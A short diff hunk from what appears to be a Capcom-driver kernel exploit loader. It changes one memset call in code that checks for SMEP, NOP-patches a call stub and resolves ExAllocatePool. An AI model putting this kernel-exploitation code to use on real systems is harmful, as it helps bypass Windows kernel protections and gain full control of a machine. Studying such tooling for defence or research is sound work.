@@ -58,7 +58,7 @@ static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
 	if ( !( CpuInfo[ 1 ] & ( 1 << 7 ) ) ) // EBX : 1 << 7 = SMEP
 	{
 		printf( "[+] No SMEP support!\n" );
-		Np_memset( Kh_PassiveCallStubData, 0x90, Kh_PassiveCallStubSmepEnabledOffset );
+		memset( Kh_PassiveCallStubData, 0x90, Kh_PassiveCallStubSmepEnabledOffset );
 	}
 
 	Khk_ExAllocatePool = KrCtx->GetProcAddress<fnFreeCall>( "ExAllocatePool" );
